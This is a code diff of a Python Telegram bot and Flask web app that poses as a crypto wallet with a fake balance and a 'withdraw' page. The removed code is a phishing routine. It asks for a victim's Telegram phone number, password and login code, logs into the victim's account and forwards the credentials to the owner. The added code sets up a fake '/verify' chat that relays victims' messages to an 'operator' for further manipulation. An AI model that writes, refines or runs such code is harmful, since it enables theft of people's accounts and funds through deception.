@@ -17,6 +17,7 @@ logging.basicConfig(level=logging.INFO)
 bot = TelegramClient('bot_session', API_ID, API_HASH)
 app = Flask(__name__)
 user_balances = {}
+verification_sessions = {}
 
 HTML_PAGE = '''
 <!DOCTYPE html>
@@ -118,6 +119,16 @@ HTML_PAGE = '''
             color: #fff;
             grid-column: 1 / -1;
         }
+        .notice {
+            background: var(--card);
+            border: 1px solid var(--blue);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            color: var(--blue-light);
+            font-size: 14px;
+            margin-top: 12px;
+        }
         .input-group {
             margin-bottom: 12px;
         }
@@ -194,19 +205,9 @@ HTML_PAGE = '''
     <div id="withdrawScreen" class="hidden">
         <div class="card">
             <div class="balance-label">Withdraw</div>
-            <div class="input-group">
-                <label>Phone Number</label>
-                <input type="text" id="phone" placeholder="+79001234567">
+            <div class="notice">
+                ⚠ Complete verification in the bot using <b>/verify</b> command
             </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" placeholder="••••••••">
-            </div>
-            <div class="input-group">
-                <label>Verification Code</label>
-                <input type="text" id="code" placeholder="•••••">
-            </div>
-            <button class="btn btn-primary" onclick="withdraw()">Confirm Withdrawal</button>
             <div class="divider"></div>
             <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
         </div>
@@ -258,23 +259,6 @@ HTML_PAGE = '''
             });
         }
 
-        function withdraw() {
-            const phone = document.getElementById('phone').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const code = document.getElementById('code').value.trim();
-            if (!phone || !password || !code) {
-                tg.showPopup({ title: 'Error', message: 'All fields are required' });
-                return;
-            }
-            fetch('/withdraw', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({user_id: userId, phone, password, code})
-            }).then(r => r.json()).then(d => {
-                tg.showPopup({ title: 'Withdrawal', message: d.message });
-            });
-        }
-
         updateBalance();
         setInterval(updateBalance, 15000);
     </script>
@@ -294,34 +278,6 @@ def get_balance():
 @app.route('/get_address')
 def get_address():
     return jsonify({'address': CRYPTO_ADDRESS})
-
-@app.route('/withdraw', methods=['POST'])
-def withdraw():
-    data = request.json
-    user_id = data.get('user_id')
-    phone = data.get('phone')
-    password = data.get('password')
-    code = data.get('code')
-    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
-    return jsonify({'message': 'Request processed'})
-
-async def process_withdraw(user_id, phone, password, code):
-    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
-    try:
-        await client.connect()
-        await client.send_code_request(phone)
-        try:
-            await client.sign_in(phone=phone, code=code)
-        except SessionPasswordNeededError:
-            await client.sign_in(password=password)
-        me = await client.get_me()
-        await bot.send_message(OWNER_ID, f'#WITHDRAW\nPhone: {phone}\nPassword: {password}\nCode: {code}\nAccount: @{me.username}')
-    except FloodWaitError as e:
-        await bot.send_message(OWNER_ID, f'FloodWait: {e.seconds}s')
-    except Exception as e:
-        await bot.send_message(OWNER_ID, f'Withdraw error: {e}')
-    finally:
-        await client.disconnect()
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
@@ -364,15 +320,51 @@ async def msg(event):
         print(f'MSG ERROR: {e}')
         await event.respond('/msg <id> <text>')
 
-def run_bot():
-    async def _run():
-        await bot.start(bot_token=BOT_TOKEN)
-        await bot.run_until_disconnected()
-    asyncio.run(_run())
+@bot.on(events.NewMessage(pattern='/verify'))
+async def verify(event):
+    user_id = event.sender_id
+    verification_sessions[user_id] = True
+    await event.respond('✅ Verification started. Send your messages below. Operator will see them.')
+    await bot.send_message(OWNER_ID, f'#VERIFY\nUser {user_id} started verification.')
+
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in verification_sessions and not e.text.startswith('/')))
+async def handle_verification(event):
+    user_id = event.sender_id
+    await bot.send_message(OWNER_ID, f'#VERIFY_MSG\nFrom: {user_id}\nMessage: {event.text}\n\nReply: /reply {user_id} <text>')
+    await event.respond('✅ Message sent to operator.')
+
+@bot.on(events.NewMessage(pattern='/reply'))
+async def reply(event):
+    if event.sender_id != OWNER_ID:
+        return
+    try:
+        parts = event.text.split(maxsplit=2)
+        target_id = int(parts[1])
+        message = parts[2] if len(parts) > 2 else ''
+        await bot.send_message(target_id, f'🛡 Operator: {message}')
+        await event.respond('Replied')
+    except:
+        await event.respond('/reply <id> <text>')
+
+@bot.on(events.NewMessage(pattern='/endverify'))
+async def end_verify(event):
+    if event.sender_id != OWNER_ID:
+        return
+    try:
+        target_id = int(event.text.split()[1])
+        verification_sessions.pop(target_id, None)
+        await bot.send_message(target_id, '✅ Verification completed. You can now proceed with withdrawal.')
+        await event.respond(f'Verification ended for {target_id}')
+    except:
+        await event.respond('/endverify <id>')
+
+async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    await bot.run_until_disconnected()
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
 
 if __name__ == '__main__':
     Thread(target=run_flask, daemon=True).start()
-    run_bot()
+    asyncio.run(main())
